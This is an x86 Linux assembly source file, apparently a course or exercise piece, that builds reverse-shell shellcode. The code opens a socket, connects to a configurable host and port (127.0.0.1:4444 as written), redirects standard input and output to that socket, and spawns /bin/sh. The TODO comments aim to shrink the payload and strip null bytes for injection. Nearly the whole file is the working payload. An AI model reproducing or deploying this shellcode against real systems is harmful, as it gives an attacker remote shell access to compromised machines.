; Generates shellcode which performs a callback to the provided host and port
; TODO shrink the size down (goals: https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/)
; TODO remove nulls
BITS	32
global _start

; Linux macros
%define	AF_INET		0x2
%define	SOCK_STREAM	0x1
%define SYS_SOCKETCALL	0x66
%define	SYS_SOCKET	0x1
%define	SYS_CONNECT 	0x3
%define SYS_DUP2	0x3f
%define SYS_EXECVE	0xb

; Callback config
%define HTONS_PORT	0x5c11			; htons(4444)
%define INET_PTON_ADDR	0x7f, 0x00, 0x00, 0x01	; inet_pton("127.0.0.1")

SECTION	.text

_start:
	; Preserve ebx
	push	ebx

	push	ebp
	mov	ebp, esp
	sub	esp, 0xc
	
	; Set up params for call to socket
	mov	DWORD [ebp-0xc], AF_INET
	mov	DWORD [ebp-0x8], SOCK_STREAM
	mov	DWORD [ebp-0x4], 0

	; Make call to sys_socketcall to create socket
	; We'll clean up the stack when we're all done
	push	SYS_SOCKET		; pass call number for socket
	call	make_socketcall		; make the syscall

	; Save the socket fd as a local
	mov	DWORD [ebp-0xc], eax	; sockfd from call to socket

	; Get a position-independent reference to the sockaddr_in data
	; via jmp-call-pop trick
	jmp	get_data

pop_addr:	
	pop	edx			; edx = &sin

	; Set up remaining params for call to connect (sockfd set earlier)
	mov	DWORD [ebp-0x8], edx	; &sin from jmp-call-pop
	mov	DWORD [ebp-0x4], SIN_LEN ; sizeof(struct sockaddr_in)

	; Make call to sys_socketcall to connect to remote host
	push	SYS_CONNECT		; pass call number for connect
	call	make_socketcall		; make the syscall

	; If connection failed, clean up and exit
	test	eax, eax
	jne	.done

	; Duplicate sockfd to stdin, stdout, and stderr via dup2 syscall
	xor	ecx, ecx		; clean ecx for dup_socket func
	push	0			; stdin
	call	dup_socket		; dup2(sockfd, 0)

	push	1			; stdout
	call	dup_socket		; dup2(sockfd, 1)

	push	2			; stderr
	call	dup_socket		; dup2(sockfd, 2)

	; Make syscall to execve to spawn shell
	mov	al, SYS_EXECVE		; load syscall number
	lea	ebx, [edx+EXEC_ARGS]	; filename = "/bin/sh"
	xor	ecx, ecx		; **argv = NULL
	xor	edx, edx		; **envp = NULL
	int	0x80			; make syscall and pop netshell!

.done:
	; Clean up the stack and restore ebx
	mov	esp, ebp
	pop	ebp
	pop	ebx
	ret	
	

; HELPER FUNCTIONS
make_socketcall:
	; sys_socketcall is multiplexed to handle all the system calls for
	; sockets. Linux kernel 4.3 plus has direct syscalls, but this method
	; goes further back.
	mov	al, SYS_SOCKETCALL	; load syscall number
	mov	bl, [esp+4]		; call number passed as arg
	lea	ecx, [ebp-0xc]		; ptr to args
	int	0x80			; make syscall
	ret
	
dup_socket:
	; Makes a syscall to dup2 with oldfd set to sockfd
	mov	al, SYS_DUP2		; syscall #
	mov	bl, [ebp-0xc]		; oldfd (sockfd)
	mov	cl, [esp+4]		; newfd
	int	0x80			; make syscall
	ret

get_data:
	call	pop_addr


; PIC DATA
DATA:
_SOCKADDR_IN:
	SOCKADDR_IN equ $-DATA
	; struct sockaddr_in saddr = {
	;	.sin_family = AF_INET
	;	.sin_port = HTONS_PORT
	;	.sin_addr.s_addr = INET_PTON_ADDR
	;	.sin_zero[8] = { 0 }
	; }
	dw	AF_INET			; sin_family
	dw	HTONS_PORT		; sin_port
	db	INET_PTON_ADDR		; sin_addr.s_addr
	times 8	db 0			; sin_zero

	SIN_LEN equ $-_SOCKADDR_IN	; sizeof(struct sockaddr_in)

_EXEC_ARGS:
	EXEC_ARGS equ $-DATA
	db	"/bin/sh", 0

